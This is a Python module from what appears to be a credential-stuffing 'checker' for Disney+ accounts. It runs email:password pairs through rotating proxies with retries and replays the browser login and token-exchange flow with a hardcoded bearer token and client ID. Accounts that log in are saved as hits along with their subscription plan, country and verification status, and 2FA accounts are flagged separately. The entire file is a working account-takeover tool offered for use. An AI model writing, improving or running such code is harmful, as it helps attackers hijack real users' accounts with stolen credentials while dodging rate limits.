from modules.variables import Checker
from modules.functions import return_proxy, set_proxy,log,save,bad_proxy
from requests import Session
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)

            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                payload = {"deviceFamily":"browser","applicationRuntime":"chrome","deviceProfile":"windows","attributes":{}}
                headers = {
                    "accept": "application/json" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/json" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
                }
                r = s.post('https://global.edge.bamgrid.com/devices',json=payload,headers=headers)
                if r.status_code == 403: raise

                token = r.json()['assertion']
                payload = f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={token}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice"
                headers = {
                    "accept": "application/json" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/x-www-form-urlencoded" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
                }
                r = s.post('https://global.edge.bamgrid.com/token',data=payload,headers=headers)
                if 'unauthorized_client' in r.text or 'invalid-token' in r.text: raise
                
                auth_token = r.json()['access_token']
                headers = {
                    "accept": "application/json; charset=utf-8" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": f"Bearer {auth_token}" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/json; charset=UTF-8" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
                }
                payload = {'email':email}
                r = s.post('https://global.edge.bamgrid.com/idp/check',headers=headers,json=payload)
                if "\"operations\":[\"Register\"]" in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "\"operations\":[\"OTP\"]" in r.text:
                    if not Checker.cui: log("custom",":".join([email,password]),"Disney")
                    save("Disney","custom",Checker.time,":".join([email,password])+' | 2FA')
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                elif "\"operations\":[\"Login\",\"OTP\"]" not in r.text: raise

                headers = {
                    "accept": "application/json" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": f"Bearer {auth_token}" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/json" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
                }
                payload = {'email':email,'password':password}
                r = s.post('https://global.edge.bamgrid.com/idp/login',json=payload,headers=headers)
                if 'Bad credentials sent for' in r.text or 'is not a valid email Address at /email' in r.text or "idp.error.identity.bad-credentials" in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                if 'token_type' not in r.text or 'id_token' not in r.text: raise
                
                id_token = r.json()['id_token']
                payload = {'id_token':id_token}
                headers = {
                    "accept": "application/json; charset=utf-8" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": f"Bearer {auth_token}" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/json; charset=UTF-8" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
                }
                r = s.post('https://global.edge.bamgrid.com/accounts/grant',json=payload,headers=headers)
                if 'Account archived' in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return

                assertion = r.json()['assertion']
                payload = f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount" 
                headers = {
                    "accept": "application/json" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84" ,
                    "cache-control": "no-cache" ,
                    "content-type": "application/x-www-form-urlencoded" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
                }
                r = s.post("https://global.edge.bamgrid.com/token",data=payload,headers=headers)

                access_token = r.json()['access_token']
                headers = {
                    "authorization": f"Bearer {access_token}" ,
                    "accept": "application/vnd.session-service+json; version=1" ,
                    "accept-encoding": "gzip, deflate, br" ,
                    "accept-language": "en-US,en;q=0.9" ,
                    "cache-control": "no-cache" ,
                    "origin": "https://www.disneyplus.com" ,
                    "pragma": "no-cache" ,
                    "referer": "https://www.disneyplus.com/" ,
                    "sec-fetch-dest": "empty" ,
                    "sec-fetch-mode": "cors" ,
                    "sec-fetch-site": "cross-site" ,
                    "sec-gpc": "1" ,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ,
                    "x-bamsdk-client-id": "disney-svod-3d9324fc" ,
                    "x-bamsdk-platform": "windows" ,
                    "x-bamsdk-version": "4.16" ,
                }
                r = s.get('https://global.edge.bamgrid.com/subscriptions',headers=headers)
                if r.text == '[]' or ("\"isActive\":false" in r.text and "\"isActive\":true" not in r.text):
                    if not Checker.cui: log("custom",":".join([email,password]),"Disney")
                    save("Disney","custom",Checker.time,":".join([email,password]))
                    return_proxy(proxy)
                    Checker.custom += 1
                    return
                elif "\"isActive\":true" not in r.text: raise
                
                plan = r.text.split('name":"')[1].split('"')[0]
                
                r = s.get('https://global.edge.bamgrid.com/accounts/me',headers=headers)

                verified = r.text.split('emailVerified":')[1].split(',')[0]
                country = r.text.split('country":"')[1].split('"')[0]

                if not Checker.cui: log("good",":".join([email,password]),"Disney")
                save("Disney","good",Checker.time,":".join([email,password])+f" | Plan: {plan} | Country: {country} | Verified: {verified}")
                return_proxy(proxy)
                Checker.good += 1
                return
        except:
            return_proxy(proxy)
            bad_proxy(proxy)
            Checker.errors += 1